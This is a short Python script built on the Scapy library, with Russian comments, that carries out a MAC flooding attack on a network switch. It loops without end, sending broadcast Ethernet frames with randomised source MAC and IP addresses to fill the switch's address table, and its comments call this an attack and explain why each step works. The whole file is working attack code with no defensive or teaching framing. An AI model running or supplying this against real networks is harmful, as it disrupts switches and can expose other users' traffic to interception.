#!/usr/bin/env python3

from scapy.all import sendp, Ether, IP, TCP, RandMAC, RandIP
import time

# Отключаем подробный вывод Scapy
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def main():
    """
    Главная функция для запуска атаки МАС-флудинга.
    """
    print("[*] Запуск атаки МАС-флудинга...")
    print("[*] Отправка пакетов со случайными MAC-адресами...")
    print("[*] Нажмите Ctrl+C для остановки.")
    
    packet_count = 0
    try:
        while True:
            # 1. Создаем Ethernet-кадр (L2)
            #    src=RandMAC() - Это КЛЮЧЕВАЯ часть. Мы генерируем случайный MAC-адрес источника.
            #    dst="ff:ff:ff:ff:ff:ff" - Мы отправляем широковещательный пакет,
            #    чтобы коммутатор гарантированно его обработал и записал наш MAC-адрес.
            
            # 2. Создаем IP-пакет (L3)
            #    Мы также делаем IP-адреса случайными, чтобы трафик выглядел разнообразнее.
            
            packet = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / \
                     IP(src=RandIP(), dst=RandIP()) / \
                     TCP(dport=80)
            
            # 3. Отправляем пакет на L2-уровне
            #    sendp() используется для отправки L2-пакетов
            sendp(packet, verbose=False)
            
            packet_count += 1
            print(f"\r[+] Отправлено пакетов: {packet_count}", end="")

    except KeyboardInterrupt:
        print("\n[!] Атака остановлена.")
    except Exception as e:
        print(f"\n[!] Произошла ошибка: {e}")

if __name__ == "__main__":
    main()
